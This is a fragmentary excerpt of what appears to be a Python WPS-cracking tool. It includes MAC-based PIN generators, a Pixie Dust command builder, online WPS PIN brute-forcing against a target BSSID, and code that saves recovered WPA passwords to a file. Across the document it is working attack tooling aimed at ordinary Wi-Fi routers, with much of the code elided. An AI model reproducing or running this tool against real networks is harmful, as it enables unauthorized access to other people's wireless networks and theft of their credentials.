...
class WPSpin:
    ...
    def __init__(self):
        ...
        self.algos = {
            ...
            "pinTrendNet": {
                "name": "TrendNet",
                "mode": self.ALGO_MAC,
                "gen": self.pinTrendNet,
            },
            # Static pin algos
            "pinGeneric": {
                "name": "Static",
                "mode": self.ALGO_STATIC_DB,
    ...
    def pinArris(self, bssid):
        ...
        for i, mac in enumerate(array_macs):
            ...
            fibnum.append(
                fib_gen(adjusted_mac)
                + (fib_gen(counter) if counter else 0)
            )

        fibsum = sum(
            fib * fib_gen(i + 16) for i, fib in enumerate(fibnum)
        ) + sum(array_macs)
...
class PixiewpsData:
    ...
    def get_pixie_cmd(self, full_range=False):
        pixiecmd = (
            f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1}"
...
class BruteforceStatus:
    ...
    def display_status(self):
        ...
        print(
            f"[*] {percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)"
        )
...
class Companion:
    ...
    def __init__(
        self, interface, save_result=False, print_debug=False
    ):
    ...
    def __handle_wpas(
        ...
        if line.startswith("WPS: "):
            if "Building Message M" in line:
                n = int(
                    line.split("Building Message M")[1].replace(
                        "D", ""
                    )
                )
            ...
            if "msg=5 config_error=15" in line:
                ...
                if "config_error=15" in line:
                    print(
                        "[*] Received WPS-FAIL with reason: WPS LOCKED"
                    )
                    self.connection_status.status = "WPS_FAIL"
                else:
                ...
                print(
                    "[*] Received WPS-FAIL with reason: CRC FAILURE"
                )
                self.connection_status.status = "WPS_FAIL"
            else:
                self.connection_status.status = "WPS_FAIL"
    ...
    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        ...
        with open(
            filename + ".csv", "a", newline="", encoding="utf-8"
        ) as file:
            ...
            if writeTableHeader:
                csvWriter.writerow(
                    ["Date", "BSSID", "ESSID", "WPS PIN", "WPA PSK"]
                )
            csvWriter.writerow(
                [dateStr, bssid, essid, wps_pin, wpa_psk]
            )
        print(
            f"[i] Credentials saved to {filename}.txt, {filename}.csv"
        )
    ...
    def __prompt_wpspin(self, bssid):
        ...
        if len(pins) > 1:
            ...
            pin = pins[0]
            print(
                "[i] The only probable PIN is selected:", pin["name"]
            )
            pin = pin["pin"]
        else:
            return None
    ...
    def __wps_connection(
        ...
        if pbc_mode:
            if bssid:
                print(
                    f"[*] Starting WPS push button connection to {bssid}…"
                )
                cmd = f"WPS_PBC {bssid}"
            else:
        ...
        if not pin:
            if pixiemode:
                try:
                    ...
                    pin = (
                        self.generator.getLikely(bssid) or "12345670"
                    )
            elif not pbc_mode:
    ...
    def __second_half_bruteforce(
        ...
        while int(s_half) < 1000:
            ...
            if self.connection_status.last_m_message > 6:
                ...
                return self.__second_half_bruteforce(
                    bssid, f_half, s_half
                )
    ...
    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        ...
        try:
            ...
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(
                    bssid, mask, delay
                )
                if f_half and (
                    self.connection_status.status != "GOT_PSK"
                ):
                    self.__second_half_bruteforce(
                        bssid, f_half, "001", delay
                    )
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(
                    bssid, f_half, s_half, delay
                )
...
class WiFiScanner:
    ...
    def iw_scanner(self) -> dict[int, dict]:
        ...
        network_list = {
            (i + 1): network for i, network in enumerate(networks)
        }
        ...
        for n, network in network_list_items:
            ...
            if (network["BSSID"], network["ESSID"]) in self.stored:
                ...
                self.vuln_list and (model in self.vuln_list)
            ) or self.checkvuln_from_pin_csv(
                os.path.join(
                    os.path.dirname(os.path.realpath(__file__)),
                    "pins.csv",
                ),
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        "-b", "--bssid", type=str, help="BSSID of the target AP"
    )
    parser.add_argument(
        "-s", "--ssid", type=str, help="SSID of the target AP"
    )
    parser.add_argument(
        "-p",
        "--pin",
    ...
    parser.add_argument(
        "-l", "--loop", action="store_true", help="Run in a loop"
    )
    parser.add_argument(
        "-r",
        "--reverse-scan",
